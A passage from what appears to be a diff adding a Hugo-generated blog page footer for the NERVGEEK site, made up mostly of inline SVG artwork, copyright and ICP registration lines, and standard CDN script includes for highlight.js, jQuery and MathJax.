11.85485-5.279891 11.854849-11.854849 0-2.291273 1.793171-4.084444 4.084444-4.084445s4.084444 1.793171 4.084444 4.084445c0 11.157506-8.965853 20.123358-20.023737 20.123358z" fill="" p-id="1035"></path><path d="M499.099134 580.688394c-11.057885 0-19.924117-8.965853-19.924117-19.924117 0-2.291273 1.793171-4.084444 4.084444-4.084444s4.084444 1.793171 4.084444 4.084444c0 6.475338 5.279891 11.85485 11.85485 11.854849 3.586341 0 6.973441-1.593929 9.165094-4.383305 1.394688-1.793171 3.984823-1.992412 5.777994-0.597724 1.793171 1.394688 1.992412 3.984823 0.597723 5.777994-3.885203 4.482926-9.563576 7.272303-15.640432 7.272303z" fill="" p-id="1036"></path><path d="M495.712034 390.313455c-4.283685 11.755229-8.56737 17.234361-18.72867 17.234361-10.1613 0-14.644226-7.969647-18.429808-18.529429-4.781788-13.149917 4.682168-25.801732 18.330188-25.403249 16.636638 0.498103 23.610079 13.5484 18.82829 26.698317zM545.123845 383.240393c-3.088238 5.977235-6.176476 8.666991-13.5484 8.666991-7.272303 0-10.559782-4.084444-13.249538-9.364335-3.48672-6.674579 3.3871-13.050297 13.249538-12.851056 12.054091 0.298862 17.03512 6.87382 13.5484 13.5484zM441.916918 383.240393c-3.088238 5.977235-6.176476 8.666991-13.5484 8.666991-7.272303 0-10.559782-4.084444-13.249538-9.364335-3.48672-6.674579 3.3871-13.050297 13.249538-12.851056 12.054091 0.298862 17.03512 6.87382 13.5484 13.5484z" fill="#F97700" p-id="1037"></path><path d="M467.320167 534.663683h33.372897c5.379512 0 8.268509 6.276097 4.781788 10.360541l-17.134741 16.437397c-2.490515 2.888997-7.073062 2.888997-9.563576 0l-16.238156-16.437397c-3.48672-4.084444-0.597724-10.360541 4.781788-10.360541z" fill="" p-id="1038"></path><path d="M667.457924 364.511723c18.031326-11.95447 46.423193-27.993385 67.243895-34.269482-0.199241-0.099621-0.398482-0.199241-0.597723-0.398482-18.031326-10.26092-63.259072 16.537017-90.555113 34.568343h23.908941z" fill="#FEE6A5" p-id="1039"></path><path d="M295.873139 437.433992c-2.291273-27.19642-18.230567-96.432727 9.563577-109.184162-6.276097-0.896585-12.651814-1.095826-16.736259 1.195447-21.219185 12.153711-16.736258 80.593054-14.444985 108.088335-38.154684 45.327366-84.378636 155.109252-73.719233 234.008756l24.606285 0.298862c-9.862438-78.799883 32.775173-189.478354 70.730615-234.407238z" fill="#F1E8E3" p-id="1040"></path><path d="M302.84658 672.737815c1.295068 28.790349-26.698317 39.648993-63.757174 39.648993s-72.125304-7.770406-70.332134-39.648993c1.69355-30.68314 36.261893-55.588287 67.044654-55.588287 34.369102 0 65.649966 24.905146 67.044654 55.588287z" fill="#FFFFFF" p-id="1041"></path><path d="M239.089406 718.862146c-33.372896 0-55.389046-6.076856-67.243896-18.629049-6.973441-7.371923-10.1613-16.736258-9.563576-27.893764 0.896585-16.337776 9.862438-31.878587 25.104388-44.032299 14.146123-11.257126 31.878587-17.732464 48.415604-17.732464 38.353925 0 72.025683 28.292246 73.519992 61.764763 0.498103 11.356747-2.888997 20.920323-10.161299 28.491487-11.356747 12.054091-31.579726 18.031326-60.071213 18.031326z m-3.28748-95.137659c-32.476311 0-59.174628 26.598696-60.469695 49.41181-0.398482 7.471544 1.593929 13.448779 5.977235 18.230567 9.165094 9.663197 28.591108 14.544606 57.77994 14.544606 24.407043 0 41.940267-4.781788 50.706878-13.946882 4.682168-4.881409 6.87382-11.057885 6.475338-18.828291-1.195447-26.797938-28.88997-49.41181-60.469696-49.41181z" fill="#6B3437" p-id="1042"></path><path d="M295.474657 671.84123c-0.597724-7.073062-3.187859-14.644226-8.168888-21.518047 0.498103 2.390894 0.796965 4.781788 0.996206 7.172682 1.095826 25.602491-16.636638 33.472517-49.611052 33.472517s-57.182216-6.574959-55.588287-34.966825c0.099621-1.992412 1.295068-3.287479 1.69355-5.180271-3.785582 5.578753-7.272303 11.356747-8.168888 18.927911-3.685962 30.284658 27.893764 37.45734 62.163246 37.457341 28.591108 0.099621 58.875766-9.165094 56.684113-35.365308z" fill="#F1E8E3" p-id="1043"></path><path d="M745.859325 440.721471s23.80932 35.166067 32.077828 71.228719c0 0-3.187859 6.574959-10.659402 13.448779 0 0-1.494309-37.158478-21.418426-84.677498z" fill="#E0930A" p-id="1044"></path><path d="M777.937153 511.95019s-5.777994 8.56737-10.659402 13.448779c-4.881409 4.881409 0 0 0 0s15.34157 82.087363 12.552194 140.564646l24.207802 2.590135c-0.099621 0-5.578753-106.892888-26.100594-156.60356" fill="#F1E8E3" p-id="1045"></path><path d="M793.677206 672.737815c1.295068 28.790349-26.698317 39.648993-63.757175 39.648993s-72.125304-7.770406-70.332133-39.648993c1.69355-30.68314 36.261893-55.588287 67.044654-55.588287 34.369102 0 65.649966 24.905146 67.044654 55.588287z" fill="#FFFFFF" p-id="1046"></path><path d="M729.920031 718.862146c-33.372896 0-55.389046-6.076856-67.243895-18.629049-6.973441-7.371923-10.1613-16.736258-9.563576-27.893764 0.896585-16.337776 9.862438-31.878587 25.104387-44.032299 14.146123-11.257126 31.878587-17.732464 48.415605-17.732464 38.353925 0 72.025683 28.292246 73.519992 61.764763 0.498103 11.356747-2.888997 20.920323-10.1613 28.491487-11.356747 12.054091-31.579726 18.031326-60.071213 18.031326z m-3.287479-95.137659c-32.476311 0-59.174628 26.598696-60.469696 49.41181-0.398482 7.471544 1.593929 13.448779 5.977235 18.230567 9.165094 9.663197 28.591108 14.544606 57.77994 14.544606 24.407043 0 41.940267-4.781788 50.706878-13.946882 4.682168-4.881409 6.87382-11.057885 6.475338-18.828291-1.195447-26.797938-28.88997-49.41181-60.469695-49.41181z" fill="#6B3437" p-id="1047"></path><path d="M786.504524 671.641989c-0.597724-7.073062-3.48672-14.743847-8.46775-21.717288 0.498103 2.390894 0.796965 4.781788 0.996206 7.172682 1.095826 25.602491-16.437397 33.771379-49.411811 33.771379s-57.281837-6.574959-55.687907-34.966826c0.099621-1.992412 1.095826-2.988618 1.494309-4.881409-3.785582 5.578753-7.073062 10.1613-7.969647 17.732465-3.685962 30.384279 26.399455 38.254305 62.262866 38.353925 34.667964 0.298862 58.875766-9.264714 56.783734-35.464928z" fill="#F1E8E3" p-id="1048"></path><path d="M250.246911 566.143788c-3.088238 2.988618-6.176476 4.383306-13.548399 4.383306s-10.559782-1.992412-13.249538-4.682167c-3.48672-3.287479 3.3871-6.574959 13.249538-6.375718 11.95447 0.099621 17.03512 3.3871 13.548399 6.674579zM247.158673 595.731102c-3.088238 4.582547-6.176476 6.674579-13.5484 6.674579s-10.559782-3.088238-13.249538-7.172682c-3.48672-5.18027 3.3871-10.061679 13.249538-9.862438 11.95447 0.099621 17.03512 5.18027 13.5484 10.360541zM791.186691 588.658041c-3.088238 4.582547-6.176476 6.674579-13.548399 6.674579s-10.559782-3.088238-13.249538-7.172682c-3.48672-5.18027 3.3871-10.061679 13.249538-9.862438 12.054091 0.099621 17.03512 5.18027 13.548399 10.360541z" fill="#F97700" p-id="1049"></path></svg>
+      <br />
+      Another Blog <a href="https://www.miaoplus.com" target="_blank">Miao+</a>
+    </p>
+
+    <p class="copyright">
+      <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="86px" height="30px" viewBox="232 265 280 140" enable-background="new 0 0 800 800" xml:space="preserve"><g><path fill="#00A0FF" d="M282.639,281.223L282.639,281.223L282.639,281.223L282.639,281.223L282.639,281.223c-2.473-1.861-5.034-3.52-7.664-4.983c-1.904-1.059-4.295-0.564-5.604,1.177l-16.492,21.912l-1.176,1.563c-1.786,2.373-4.638,3.665-7.605,3.529c-1.082-0.049-2.164-0.039-3.242,0.029c-8.289,0.525-16.308,4.525-21.694,11.681c-4.33,5.753-6.229,12.576-5.879,19.245c0.063,1.201,0.757,2.298,1.851,2.796c2.27,1.032,4.017,3.137,4.454,5.83c0.618,3.809-1.722,7.551-5.418,8.659c-4.357,1.306-8.832-1.363-9.814-5.724c-0.532-2.362,0.079-4.711,1.463-6.48c0.768-0.981,1.154-2.203,1.044-3.444c-0.758-8.552,1.52-17.402,7.09-24.802c7.026-9.334,17.717-14.274,28.562-14.337c2.09-0.012,4.052-1.011,5.309-2.681l15.188-20.178c1.189-1.579,0.421-3.848-1.476-4.405c-25.43-7.46-53.905,0.934-70.96,23.146c-22.099,28.781-16.729,70.279,11.987,92.462c2.687,2.076,5.482,3.909,8.36,5.508c1.893,1.052,4.274,0.537,5.577-1.193l16.492-21.911l1.176-1.563c1.786-2.373,4.638-3.665,7.605-3.529c1.082,0.049,2.164,0.039,3.242-0.029c8.289-0.525,16.308-4.525,21.694-11.681c4.33-5.753,6.229-12.576,5.879-19.245c-0.063-1.201-0.757-2.298-1.851-2.796c-2.27-1.032-4.017-3.137-4.454-5.83c-0.618-3.809,1.722-7.551,5.418-8.658c4.357-1.306,8.832,1.363,9.814,5.724c0.532,2.362-0.079,4.711-1.463,6.48c-0.768,0.981-1.154,2.203-1.044,3.444c0.758,8.552-1.52,17.402-7.09,24.802c-7.026,9.334-17.717,14.274-28.562,14.337c-2.09,0.012-4.052,1.011-5.309,2.681l-15.187,20.177c-1.18,1.568-0.439,3.842,1.444,4.396c25.633,7.534,54.368-1.045,71.384-23.652C317.614,344.545,311.773,303.151,282.639,281.223z"/><g><path fill="#00A0FF" d="M391.613,299.257l-0.001-1.567c-0.001-1.133-0.92-2.052-2.053-2.052h-51.424c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h43.629c1.255,0,2.221,1.107,2.034,2.348c-1.224,8.113-5.061,23.285-17.051,37.854c-0.847,1.029-2.419,1.011-3.241-0.039c-10.032-12.828-13.119-25.98-13.962-30.826c-0.184-1.061-1.166-1.792-2.237-1.678l-1.643,0.174l-1.449,0.151c-1.188,0.124-2.026,1.228-1.808,2.403c1.028,5.558,4.773,20.841,16.549,35.388c0.683,0.843,0.625,2.076-0.175,2.81c-14.336,13.149-27.229,16.031-31.841,16.657c-1.027,0.14-1.794,1.009-1.789,2.046l0.015,3.169c0.006,1.22,1.065,2.174,2.276,2.032c5.484-0.645,20.116-3.743,36.284-18.613c0.799-0.734,2.014-0.734,2.81,0.003c7.813,7.235,17.799,14.211,31.266,18.495c1.091,0.347,2.259-0.287,2.582-1.385l0.887-3.007c0.318-1.078-0.297-2.198-1.367-2.539c-12.252-3.908-21.285-10.2-28.378-16.651c-0.818-0.744-0.859-2.006-0.141-2.846C391.369,325.431,391.615,300.395,391.613,299.257z"/><path fill="#00A0FF" d="M427.31,292.355h-3.137c-1.134,0-2.053,0.919-2.053,2.053v10.999c0,1.134-0.919,2.053-2.053,2.053h-7.379c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h7.379c1.134,0,2.053,0.919,2.053,2.053v15.933c0,1.134-0.919,2.053-2.053,2.053h-7.379c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h7.379c1.134,0,2.053,0.919,2.053,2.053v15.065c0,3.27-1.307,8.606-9.648,9.31c-1.078,0.091-1.921,0.965-1.921,2.047v3.125c0,1.196,1.017,2.157,2.209,2.055c8.099-0.693,16.603-5.292,16.603-16.537v-15.065c0-1.134,0.919-2.053,2.053-2.053h6.557c1.134,0,2.053-0.919,2.053-2.053v-3.137c0-1.134-0.919-2.053-2.053-2.053h-6.557c-1.134,0-2.053-0.919-2.053-2.053v-15.933c0-1.134,0.919-2.053,2.053-2.053h6.557c1.134,0,2.053-0.919,2.053-2.053v-3.137c0-1.134-0.919-2.053-2.053-2.053h-6.557c-1.134,0-2.053-0.919-2.053-2.053v-10.999C429.363,293.274,428.444,292.355,427.31,292.355z"/><path fill="#00A0FF" d="M443.648,373.092c0,1.134,0.919,2.053,2.053,2.053h23.138c10.239,0,18.569-7.94,18.569-17.7v-48.63c0-1.134-0.919-2.053-2.053-2.053h-39.654c-1.134,0-2.053,0.919-2.053,2.053V373.092z M468.839,367.902h-15.895c-1.134,0-2.053-0.919-2.053-2.053v-21.81c0-1.134,0.919-2.053,2.053-2.053h25.167c1.134,0,2.053,0.919,2.053,2.053v13.406C480.165,363.211,475.084,367.902,468.839,367.902z M480.165,316.059v16.631c0,1.134-0.919,2.053-2.053,2.053h-25.167c-1.134,0-2.053-0.919-2.053-2.053v-16.631c0-1.134,0.919-2.053,2.053-2.053h25.167C479.246,314.006,480.165,314.925,480.165,316.059z"/><path fill="#00A0FF" d="M475.171,292.301h-20.44c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h20.44c1.134,0,2.053-0.919,2.053-2.053v-3.137C477.224,293.22,476.305,292.301,475.171,292.301z"/><path fill="#00A0FF" d="M553.303,295.487H510.73c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h42.573c1.134,0,2.053-0.919,2.053-2.053v-3.137C555.356,296.406,554.437,295.487,553.303,295.487z"/><path fill="#00A0FF" d="M535.11,331.8h29.657c1.134,0,2.053-0.919,2.053-2.053v-3.137c0-1.134-0.919-2.053-2.053-2.053h-65.51c-1.134,0-2.053,0.919-2.053,2.053v3.137c0,1.134,0.919,2.053,2.053,2.053h20.274c1.638,0,2.617,1.824,1.711,3.189l-13.492,24.343c-0.363,0.545-0.632,1.08-0.821,1.633c-1.129,3.299-0.601,6.838,1.451,9.71c2.15,3.01,5.706,4.806,9.509,4.806h36.976c1.662,0,3.181-0.829,4.061-2.218c0.863-1.359,0.969-3.039,0.283-4.495l-8.586-16.643c-0.52-1.008-1.759-1.403-2.766-0.883l-2.788,1.439c-1.008,0.52-1.403,1.758-0.883,2.766l5.055,9.796c0.705,1.367-0.287,2.995-1.825,2.995h-29.528c-1.492,0-2.81-0.647-3.616-1.775c-0.367-0.512-0.899-1.53-0.589-2.798c0.052-0.212,0.157-0.413,0.278-0.596l16.397-28.72C531.416,332.757,533.199,331.8,535.11,331.8z"/></g></g></svg>
+      <br />
+      CDN by <a href="https://www.upyun.com/" targer="_blank">UpYun</a>
+    </p>
+
+    <p class="copyright">
+      
+        &copy; 2014 - 2019
+        
+        <a href="https://www.nervgeek.com" target="_blank">NERVGEEK</a>
+        
+        <br />
+      .
+      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>.
+      <br />
+      备案号: <a href="http://beian.miit.gov.cn" target="_blank">粤ICP备19082652号-1</a>
+    </p>
+  </section>
+</section>
+
+    </div>
+    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
+    
+
+    
+      
+    
+
+    
+      
+      
+      
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
+        
+        
+        
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
+        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
+        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
+      
+    
+    
+    
+      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
+      <script src="/js/util.js"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/backToTop.js"></script>
+      <script src="/js/randomSidebarVideo.js"></script>
+    
+
+    
+      
+        
+      
+    
+
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+      <script src="//yihui.name/js/math-code.js"></script>
+<script async
+src="//cdn.bootcss.com/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+  </body>
+</html>
+
